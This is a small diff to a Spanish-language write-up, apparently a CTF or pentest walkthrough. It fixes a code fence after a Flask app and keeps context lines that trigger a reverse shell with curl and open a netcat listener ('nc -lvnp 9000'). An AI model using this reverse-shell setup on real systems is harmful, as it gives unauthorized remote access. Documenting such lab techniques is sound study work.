@@ -226,7 +226,8 @@ def home():
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=5000)
-    ``` 
+   
+``` 
 
 - Ahora si hacemos curl `curl http://localhost:5000/` nos va a dar una reverse shell.
 - `nc -lvnp 9000` y tenemos acceso a la shell.
